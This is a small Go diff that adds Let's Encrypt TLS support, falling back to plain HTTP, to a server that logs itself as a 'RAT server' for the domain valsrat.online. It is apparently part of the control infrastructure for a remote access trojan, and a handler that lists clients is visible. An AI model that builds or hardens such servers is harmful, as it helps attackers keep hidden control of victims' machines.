@@ -683,7 +683,18 @@ func main() {
 		port = "8080"
 	}
 	log.Println("Starting RAT server on port", port)
-	log.Fatal(http.ListenAndServe("0.0.0.0:"+port, r))
+
+	// Проверяем наличие SSL сертификатов
+	certFile := "/etc/letsencrypt/live/valsrat.online/fullchain.pem"
+	certKey := "/etc/letsencrypt/live/valsrat.online/privkey.pem"
+
+	if _, err := os.Stat(certFile); err == nil {
+		log.Println("SSL certificates found, starting HTTPS server")
+		log.Fatal(http.ListenAndServeTLS(":443", certFile, certKey, r))
+	} else {
+		log.Println("SSL certificates not found, starting HTTP server")
+		log.Fatal(http.ListenAndServe("0.0.0.0:"+port, r))
+	}
 }
 
 func getClientsHandler(w http.ResponseWriter, r *http.Request) {
